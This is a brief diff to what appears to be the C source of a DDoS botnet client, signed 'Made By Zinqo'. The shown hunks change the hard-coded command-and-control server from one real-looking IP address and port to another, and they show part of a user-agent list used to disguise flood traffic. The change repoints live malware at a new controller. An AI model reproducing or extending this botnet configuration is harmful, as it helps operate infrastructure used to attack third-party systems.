@@ -25,7 +25,7 @@
 #define PRINT_BUF_LEN 12
 #define std_packet 1460
 //Made By Zinqo.
-unsigned char *commServer[] = {"104.248.115.71:606"};
+unsigned char *commServer[] = {"181.214.147.124:606"};
 
 const char *useragents[] = {
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
@@ -1703,3 +1703,4 @@ int main(int argc, unsigned char *argv[])
 
         return 0;
 }
+
